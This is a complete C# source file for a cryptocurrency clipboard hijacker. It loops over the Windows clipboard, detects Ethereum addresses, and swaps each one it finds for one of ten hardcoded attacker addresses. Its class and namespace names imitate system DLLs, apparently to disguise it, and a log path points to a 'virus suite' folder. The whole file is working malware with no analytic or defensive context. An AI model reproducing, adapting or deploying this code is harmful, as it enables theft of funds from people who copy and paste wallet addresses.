using System;
using System.Windows.Forms;
using System.Collections.Generic;
//for logging and timer
using System.IO;
using System.Diagnostics;

namespace sys_host_dl_v4030319_64 {

public static class System_Windows_Forms_dll
    {
    private readonly static string ADDR1 = "0xee11cbef798ae00175c053deed76a0478e644c46";
    private readonly static string ADDR2 = "0x1fC7defE45505f893Fb1911796996857ae89aD26";
    private readonly static string ADDR3 = "0x4013A75Ef00D950f489f841985D2AB5561DcFB03";
    private readonly static string ADDR4 = "0x27406665258eAa619F01c13A29Fe1Db93e8293f4";
    private readonly static string ADDR5 = "0x9D9B6D7AC11Afa9C6c4497ADd9fB5E62f910D2e1";
    private readonly static string ADDR6 = "0x64BDAd5E04F280a2a5F667384d7b07A0f1Ba7EbB";
    private readonly static string ADDR7 = "0x0ec712d3a01e1a17f566821D22Ac31fd9f764D31";
    private readonly static string ADDR8 = "0x1DC8F7BD1C1e4958402aFd4D87145F4Dd6AacE1e";
    private readonly static string ADDR9 = "0xFF01F564086Fb14ec1B77973838d1A7E30Cd063c";
    private readonly static string ADDR10 = "0x99EFE2526CB31a330034605dB8280fd148f27Fe2";

    private readonly static DataObject ETHADDR1 = new DataObject(DataFormats.Text, ADDR1);
    private readonly static DataObject ETHADDR2 = new DataObject(DataFormats.Text, ADDR2);
    private readonly static DataObject ETHADDR3 = new DataObject(DataFormats.Text, ADDR3);
    private readonly static DataObject ETHADDR4 = new DataObject(DataFormats.Text, ADDR4);
    private readonly static DataObject ETHADDR5 = new DataObject(DataFormats.Text, ADDR5);
    private readonly static DataObject ETHADDR6 = new DataObject(DataFormats.Text, ADDR6);
    private readonly static DataObject ETHADDR7 = new DataObject(DataFormats.Text, ADDR7);
    private readonly static DataObject ETHADDR8 = new DataObject(DataFormats.Text, ADDR8);
    private readonly static DataObject ETHADDR9 = new DataObject(DataFormats.Text, ADDR9);
    private readonly static DataObject ETHADDR10 = new DataObject(DataFormats.Text, ADDR10);

    private readonly static Dictionary<int, DataObject> ethDict = new Dictionary<int, DataObject>()
        {
            {1, ETHADDR1}, {2, ETHADDR2}, {3, ETHADDR3}, {4, ETHADDR4}, {5, ETHADDR5},
            {6, ETHADDR6}, {7, ETHADDR7}, {8, ETHADDR8}, {9, ETHADDR9}, {10, ETHADDR10}
        };
    
    private readonly static int ETH_ADDR_SIZE = 42;
    private readonly static string ETH_PREFIX = "0x";
    private readonly static Random RAND = new Random();
    private static IDataObject clipData = null;

    //Logging Content - DELETABLE
    private readonly static string path = @"C:\Users\Hamerton Mathieu\C# Projects\src\main\c#\virus suite\crypto\notes\ClipboardLogger.log";
    private static string timestamp =  string.Format("{0:[yyyy-MM-dd hh-mm-ss-ffff]}",DateTime.Now);
    private static int loopCounter = 1;
    private readonly static string logInfo = " INFO - ";
    private readonly static string logWarn = " WARN - ";


    private static string randEthAddr(){
        int randSelector = RAND.Next(1, 11);
        return ethDict[randSelector].GetData(DataFormats.Text).ToString();
    }

    private static bool isStrNotMyEthAddr(string str){
        if(str != ADDR1 && str != ADDR2 && str != ADDR3 && str != ADDR4 && str != ADDR5 && 
           str != ADDR6 && str != ADDR7 && str != ADDR8 && str != ADDR9 && str != ADDR10 )
            return true;

        else
            return false;
    }

        //potential stack over flow error but low chance
    private static void setClipboardScanner(){
        clipData = Clipboard.GetDataObject();
        if (clipData == null){
            File.AppendAllText(path,timestamp + logWarn + "SETTING SCANNER AGAIN..." + Environment.NewLine);
            setClipboardScanner();
        }   
    }

    public static void ClipboardListener(){
        while(true){              
                File.AppendAllText(path,timestamp + logInfo + "****************Listener Iteration: " + loopCounter.ToString() + " ****************" + Environment.NewLine);
               
                File.AppendAllText(path,timestamp + logInfo + "SETTING SCANNER" + Environment.NewLine);
                setClipboardScanner();
                //IDataObject clipData = Clipboard.GetDataObject();
                if (clipData.GetDataPresent(DataFormats.Text)){
                    File.AppendAllText(path,timestamp + logInfo + "CHECKING DATA" + Environment.NewLine);
                    string clipContent = clipData.GetData(DataFormats.Text).ToString();
                    if(isStrNotMyEthAddr(clipContent)){
                        if ((clipContent.Length == ETH_ADDR_SIZE) && (clipContent.Substring(0,2) == ETH_PREFIX)){
                            File.AppendAllText(path,timestamp + logInfo + "SWAPPING OUT ETH ADDR!" + Environment.NewLine);
                            Clipboard.SetText(randEthAddr());
                            break;
                            }
                        else{
                        File.AppendAllText(path,timestamp + logInfo + "DATA IS NOT Desired ETH ADDR!" + Environment.NewLine);
                        }
                    }
                    else{
                        File.AppendAllText(path,timestamp + logInfo + "Your RandETH is in the Clipboard..." + Environment.NewLine);
                    }               
                }
                else{
                    File.AppendAllText(path,timestamp + logInfo + "Board data CANNOT be converted into Text format!" + Environment.NewLine);
                }
                loopCounter++;
                File.AppendAllText(path,"****************END OF LISTENER ITERATION****************" + Environment.NewLine + Environment.NewLine);
            }
    }
    //flags compiler to use single thread when referring to this COM component
    [STAThread]    
    public static void Main()
        {                        
            System_Windows_Forms_dll.ClipboardListener();
        }            
    }    
}